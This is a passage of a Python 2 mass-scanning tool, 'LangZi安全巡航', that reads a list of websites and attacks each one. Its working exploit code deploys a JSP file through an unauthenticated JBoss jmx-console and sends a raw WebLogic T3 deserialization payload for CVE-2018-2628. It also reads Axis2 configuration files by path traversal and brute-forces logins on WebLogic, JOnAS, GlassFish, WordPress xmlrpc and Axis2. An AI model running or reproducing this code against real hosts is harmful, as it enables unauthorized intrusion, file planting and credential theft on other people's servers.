        r_.append(r4)
        r_.append(r6)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r, timeout=timeout)
                if '/resin-doc/examples/index.xtp' in rxr.content:
                    result.append('Resin viewfile远程文件读取漏洞 : ' + str(r_r))
            except Exception, e:
                pass
    except Exception, e:
        pass

    try:
        UA = random.choice(headerss)
        headers = {'User-Agent': UA}
        rrrx = requests.get(url=str('http://' + str(ip) + ':8080/servlets-examples/'), headers=headers, timeout=5)
        if 'servlet/RequestParamExample' in rrrx.content:
            result.append('Tomcat example 应用信息泄漏漏洞:' + rrrx.url.strip('/'))
    except:
        pass

    try:
        socket.setdefaulttimeout(timeout)
        s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s1.connect((ip, int(8080)))
        shell = "langzitest"
        # s1.recv(1024)
        shellcode = ""
        name = random_str(5)
        for v in shell:
            shellcode += hex(ord(v)).replace("0x", "%")
        flag = "HEAD /jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=store&argType=" + \
               "java.lang.String&arg0=%s.war&argType=java.lang.String&arg1=langzi&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=" % (
                   name) + shellcode + \
               "&argType=boolean&arg4=True HTTP/1.0\r\n\r\n"
        s1.send(flag)
        data = s1.recv(512)
        s1.close()
        time.sleep(10)
        url = "http://%s:%d" % (ip, int(8080))
        webshell_url = "%s/%s/langzi.jsp" % (url, name)
        res = urllib2.urlopen(webshell_url, timeout=timeout)
        if 'langzitest' in res.read():
            result.append('Jboss 认证绕过漏洞 : ' + str(webshell_url))
    except Exception, e:
        pass

    try:
        r_ = []
        r2 = 'http://' + str(ip) + ':80/jmx-console/'
        r4 = 'http://' + str(ip) + ':8080/jmx-console/'
        r_.append(r2)
        r_.append(r4)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r, timeout=timeout)
                if 'flavor=URL,type=DeploymentScanner' in rxr.content:
                    result.append('JBoss后台上传漏洞 : ' + str(r_r))
            except Exception, e:
                pass
    except Exception, e:
        pass

    try:
        r_ = []
        r4 = 'http://' + str(ip) + ':7001/console/login/LoginForm.jsp'
        r8 = 'https://' + str(ip) + ':7002/console/login/LoginForm.jsp'
        r_.append(r4)
        r_.append(r8)
        for r_r in r_:
            try:
                for uuser in user_list:
                    for ppass in password_list:
                        data = {'j_username': str(uuser), 'j_password': str(ppass), 'j_character_encoding': 'GBK'}
                        rxr = requests.post(url=r_r, data=data, timeout=timeout)
                        if 'WebLogic Server Console' in rxr.content:
                            result.append('Weblogic弱口令漏洞 : ' + str(r_r + ':' + str(str(uuser) + '|' + str(ppass))))
            except Exception, e:
                pass
    except Exception, e:
        pass

    try:
        r_ = []
        r4 = 'http://' + str(ip) + ':9000/jonasAdmin/ '
        r8 = 'https://' + str(ip) + ':9000/jonasAdmin/ '
        r_.append(r4)
        r_.append(r8)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r, timeout=timeout)
                if 'JOnAS Administration' in rxr.content:
                    for uuser in user_list:
                        for ppass in password_list:
                            data = {'j_username': str(uuser), 'j_password': str(ppass)}
                            try:
                                r_br = requests.post(url=r_r, data=data, timeout=timeout)
                                if 'Deployment' in r_br.content:
                                    result.append('JOnAS弱口令漏洞 : ' + str(r_r + ':' + str(str(uuser) + '|' + str(ppass))))
                            except Exception, e:
                                pass
            except Exception, e:
                pass
    except Exception, e:
        pass

    try:
        sock = socket.socket()
        VER_SIG = ['\\$Proxy[0-9]+']
        try:
            sock.connect((str(ip), 7001))
            sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex'))
            time.sleep(1)
        except Exception, e:
            pass
        try:
            data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'
            data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077502100000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format(
                '{:04x}'.format(7001))
            data3 = '1a7727000d3234322e323134'
            data4 = '2e312e32353461863d1d0000000078'
            for d in [data1, data2, data3, data4]:
                sock.send(d.decode('hex'))
        except Exception, e:
            pass
        try:
            payload = '0565080000000100000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'
            payload += 'ACED0005737D00000001001D6A6176612E726D692E61637469766174696F6E2E416374697661746F72787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B78707372002D6A6176612E726D692E7365727665722E52656D6F74654F626A656374496E766F636174696F6E48616E646C657200000000000000020200007872001C6A6176612E726D692E7365727665722E52656D6F74654F626A656374D361B4910C61331E03000078707737000A556E6963617374526566000E3030302E3030302E3030302E303000001B590000000001EEA90B00000000000000000000000000000078'
            payload += 'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'
            payload = '%s%s' % ('{:08x}'.format(len(payload) / 2 + 4), payload)
            sock.send(payload.decode('hex'))
            res = ''
            try:
                for i in xrange(20):
                    res += sock.recv(4096)
                    time.sleep(1)
            except Exception as e:
                pass
        except Exception, e:
            pass
        try:
            p = re.findall(VER_SIG[0], res, re.S)
            if len(p) > 0:
                result.append('Weblogic CVE-2018-2628 : ' + str(ip) + ':7001')
        except Exception, e:
            pass
    except Exception, e:
        pass
    finally:
        sock.close()

    try:
        r_ = []
        r2 = 'http://' + str(ip) + ':4848'
        r_.append(r2)
        for xxixx in r_:
            error_i = 0
            flag_list = ['Just refresh the page... login will take over', 'GlassFish Console - Common Tasks',
                         '/resource/common/js/adminjsf.js">', 'Admin Console</title>', 'src="/homePage.jsf"',
                         'src="/header.jsf"', 'src="/index.jsf"', '<title>Common Tasks</title>',
                         'title="Logout from GlassFish']
            for uuser in user_list:
                for ppass in password_list:
                    try:
                        PostStr = 'j_username=%s&j_password=%s&loginButton=Login&loginButton.DisabledHiddenField=true' % (
                            uuser, ppass)
                        request = urllib2.Request(xxixx + '/j_security_check?loginButton=Login', PostStr)
                        res = urllib2.urlopen(request, timeout=timeout)
                        res_html = res.read()
                    except urllib2.HTTPError:
                        return
                    except urllib2.URLError:
                        error_i += 1
                        if error_i >= 3:
                            break
                        continue
                    for flag in flag_list:
                        if flag in res_html:
                            result.append('Glassfish弱口令漏洞 : ' + str(xxixx + ':' + str(str(uuser) + '|' + str(ppass))))
    except Exception, e:
        pass

    try:
        flag_list = ['<name>isAdmin</name>', '<name>url</name>']
        for uuser in user_list:
            for ppass in password_list:
                try:
                    login_path = '/xmlrpc.php'
                    PostStr = "<?xml version='1.0' encoding='iso-8859-1'?><methodCall>  <methodName>wp.getUsersBlogs</methodName>  <params>   <param><value>%s</value></param>   <param><value>%s</value></param>  </params></methodCall>" % (
                        uuser, ppass)
                    request = urllib2.Request('http://' + str(ip) + login_path, PostStr)
                    res = urllib2.urlopen(request, timeout=timeout)
                    res_html = res.read()
                    for flag in flag_list:
                        if flag in res_html:
                            result.append('Wordpress弱口令漏洞 : ' + str(request.url + ':' + uuser + '|' + ppass))
                except Exception, e:
                    pass

    except Exception, e:
        pass

    try:
        url = "http://%s:%d" % (ip, int(8080))
        res = urllib2.urlopen(url + '/axis2/services/listServices', timeout=timeout)
        res_code = res.code
        res_html = res.read()
        if int(res_code) == 404: return
        m = re.search('\/axis2\/services\/(.*?)\?wsdl">.*?<\/a>', res_html)
        if m.group(1):
            server_str = m.group(1)
            read_url = url + '/axis2/services/%s?xsd=../conf/axis2.xml' % (server_str)
            res = urllib2.urlopen(read_url, timeout=timeout)
            res_html = res.read()
            if 'axisconfig' in res_html:
                result.append('Axis2任意文件读取漏洞 : ' + str(read_url))
    except Exception, e:
        pass

    try:
        r_ = []
        r3 = 'http://' + str(ip) + ':9038/axis2-admin/login'
        r5 = 'http://' + str(ip) + ':8080/axis2-admin/login'
        r_.append(r3)
        r_.append(r5)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r, timeout=timeout)
                if 'action="axis2-admin/login' in rxr.content:
                    for uuser in user_list:
                        for ppass in password_list:
                            data = {'userName': str(uuser), 'password': str(ppass), 'submit': 'Login'}
                            try:
                                r_br = requests.post(url=r_r, data=data, timeout=timeout)
                                if 'Upload Service' in r_br.content:
                                    result.append('Axis2弱口令漏洞 : ' + str(r_r + ':' + str(str(uuser) + '|' + str(ppass))))
                            except Exception, e:
                                pass
            except Exception, e:
                pass
    except Exception, e:
        pass
    try:
        r_ = []
        r1 = 'http://' + str(ip) + ':8080/l.php'
        r11 = 'http://' + str(ip) + ':8080/env.php'
        r111 = 'http://' + str(ip) + ':8080/admin_aspcheck.asp'
        r1111 = 'http://' + str(ip) + ':8080/env.asp'
        r11111 = 'http://' + str(ip) + ':8080/aspcheck.asp'
        r_.append(r1)
        r_.append(r11)
        r_.append(r111)
        r_.append(r1111)
        r_.append(r11111)
        for r_r in r_:
            try:
                UA = random.choice(headerss)
                headers = {'User-Agent': UA}
                rxr = requests.get(url=r_r, headers=headers, timeout=10)
                if 'upload_max_filesize' in rxr.content or 'SoftArtisans.FileManager' in rxr.content:
                    result.append('服务器探针信息泄露:' + r_r)
                else:
                    pass
            except:
                pass
    except:
        pass

    if result == []:
        return None
    else:
        return result


'''
传入的是IP
    a = scan_ip('127.0.0.1')
    print a

    ['PHPmyadmin\xe5\xbc\xb1\xe5\x8f\xa3\xe4\xbb\xa4\xe6\xbc\x8f\xe6\xb4\x9e : http://127.0.0.1:80/phpmyadmin/index.php:root|root']
    返回对象是列表，没有用则返回None

'''

def write_result(t,c,filename):
    with open(filename,'a+')as a:
        if t == None and c != None:
            a.write(c + '\n')
        else:
            a.write('【 ' +t+' 】 : ' + c + '\n')
        if t == None and c == None:
            a.write('\n')

def live_check(url):
    try:
        headers = {
            'User-Agent': random.choice(headerss),
            'Accept': 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Cache-Control': 'max-age=0',
            'referer': random.choice(REFERERS),
            'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3',
        }
        r = requests.get(url,headers=headers,timeout=10)
    except Exception,e:
        writedata('[WARNING ERROR]  ' + str(e))
        return False

def run(url):
    if 'gov.cn' in url or 'edu.cn' in url:
        pass
    else:
        print 'Scan : ' + url
        # 存活检测
        is_alive = live_check(url)
        if is_alive == False:
            return None

        # 获取网站的标题内容，准备写入文件
        url_info = Get_Info(url)
        infos = url_info.get_infos()
        title = infos.get('title').replace('\n','').replace(' ','_')
        # 网站的标题
        service = infos.get('service')
        # 网站的服务器类型
        try:
            filename ='result/' + title.decode('utf-8') + '_漏洞报告.txt'
        except:
            filename ='result/' + title + '_漏洞报告.txt'

        with open(filename,'a+')as e:
            e.write('                             【 网站信息 】 \n')
        baidu_quanzhong = str(get_baidu_weights(url))

        # 获取网站的IP和端口开放信息等等
        ip = url_info.get_ip()
        ips = url_info.get_ips()
        open_ports = ips.get('ports_open')
        # '[80, 8443, 8009, 8080, 8181, 8088, 443]'
        open_ports_info = eval(ips.get('ports_info'))
        # "['80:World Wide Web HTTP', '8443:PCsync HTTPS', '8009:\\xe8\\xaf\\x86\\xe5\\x88\\xab\\xe5\\xa4\\xb1\\xe8\\xb4\\xa5']"

        # 获取网址的CMS类型
        cms = url_info.get_cms()
        write_result(t='网站网址', c=url, filename=filename)
        write_result(t='网站标题', c=title, filename=filename)
        write_result(t='百度权重', c=baidu_quanzhong, filename=filename)
        write_result(t='该服务器', c=service, filename=filename)
        write_result(t='开放端口', c=open_ports, filename=filename)
        with open(filename,'a+')as e:
            e.write('【 开放服务 】 \n')
            for u in open_ports_info:
                e.write(u + '\n')



        # 开始扫描检测sql
        sql_vlun = scan_sql(url,level=1)
        if sql_vlun !=None:
            writedata('[SUCCESS]  ' + str(sql_vlun))
            with open(filename, 'a+')as e:
                e.write('\n                             【 SQL 注入漏洞 】 \n')
            #write_result(t='网站标题',c=sql_vlun.get('title'),filename=filename)
            write_result(t='漏洞网址',c=sql_vlun.get('url'),filename=filename)
            write_result(t='执行命令',c=sql_vlun.get('common'),filename=filename)
            write_result(t=None,c=sql_vlun.get('report_0'),filename=filename)
            write_result(t=None,c=sql_vlun.get('report_1'),filename=filename)


        # 开始扫描检测xss
        xss_vlun = scan_xss(url,level=1)
        if xss_vlun != None:
            writedata('[SUCCESS]  ' + str(xss_vlun))
            with open(filename, 'a+')as e:
                e.write('\n                             【 XSS 漏洞 】 \n')
            write_result(t='漏洞网址',c=xss_vlun.get('url'),filename=filename)
            write_result(t='漏洞参数',c=xss_vlun.get('value'),filename=filename)
            write_result(t='请求方式',c=xss_vlun.get('request'),filename=filename)
            write_result(t='攻击载荷',c=xss_vlun.get('payload'),filename=filename)



        # 开始检查URL未授权漏洞
        url_vlun = scan_url(url)
        if url_vlun != None:
            writedata('[SUCCESS]  ' + str(url_vlun))
            with open(filename, 'a+')as e:
                e.write('\n                             【 URL 未授权漏洞 】 \n')
            for u in url_vlun:
                write_result(t=None,c=u,filename=filename)

        # 开始检查IP未授权漏洞
        ip_vlun = scan_ip(url)
        if ip_vlun != None:
            writedata('[SUCCESS]  ' + str(ip_vlun))
            with open(filename, 'a+')as e:
                e.write('\n                             【 IP 未授权漏洞 】 \n')
            for u in ip_vlun:
                write_result(t=None,c=u,filename=filename)
        # 开始检查数据库漏洞
        data_vlun = scan_database(url)
        if data_vlun != None:
            writedata('[SUCCESS]  ' + str(data_vlun))
            with open(filename, 'a+')as e:
                e.write('\n                             【 数据库弱口令漏洞 】 \n')
            write_result(t=None,c=data_vlun,filename=filename)

        # 开始检查备份文件泄露
        backup_vlun = scan_backup(url)
        if backup_vlun != None:
            writedata('[SUCCESS]  ' + str(backup_vlun))
            with open(filename, 'a+')as e:
                e.write('\n                             【 敏感信息泄露漏洞 】 \n')
            for u in backup_vlun:
                write_result(t='敏感文件泄露',c=u,filename=filename)

        svn_vlun,git_vlun = scan_svn(url),scan_git(url)
        if svn_vlun != None:
            writedata('[SUCCESS]  ' + str(svn_vlun))
            with open(filename, 'a+')as e:
                e.write('\n                             【 敏感信息泄露漏洞 】 \n')
            write_result(t='敏感文件泄露', c=svn_vlun, filename=filename)
        if git_vlun != None:
            writedata('[SUCCESS]  ' + str(git_vlun))
            with open(filename, 'a+')as e:
                e.write('\n                             【 敏感信息泄露漏洞 】 \n')
            write_result(t='敏感文件泄露', c=git_vlun, filename=filename)




if __name__ == '__main__':
    multiprocessing.freeze_support()
    if os.path.exists('result'):
        pass
    else:
        os.mkdir('result')
    print ('''
             _                           _
            | |                         (_)
            | |     __ _ _ __   __ _ _____
            | |    / _` | '_ \ / _` |_  / |
            | |___| (_| | | | | (_| |/ /| |
            |______\__,_|_| |_|\__, /___|_|
                                __/ |
                               |___/

    ''')
    time.sleep(1)
    print unicode('     LangZi安全巡航_Version_0.95_beta_原型机','utf-8')
    print unicode('     LangZi安全巡航_Version_0.95_beta_优化版','utf-8')
    print unicode('     LangZi安全巡航_Version_0.95_beta_异步版','utf-8')
    print unicode('     LangZi安全巡航_Version_0.95_beta_多进程版','utf-8')
    print unicode('     LangZi安全巡航_Version_0.95_beta_无扫描限制版','utf-8')
    print '\n'
    time.sleep(3)
    New_start = raw_input(unicode('导入网址文本(可拖拽):', 'utf-8').encode('gbk'))  # line:190
    list_ = list(set(
                [x.replace('\n', '') if x.startswith('http') else 'http://' + x.replace('\n', '') for x in
                 open(New_start, 'r').readlines()]))
    p = multiprocessing.Pool()
    for _ in list_:
        p.apply_async(run, args=(_,))
    p.close()
    p.join()













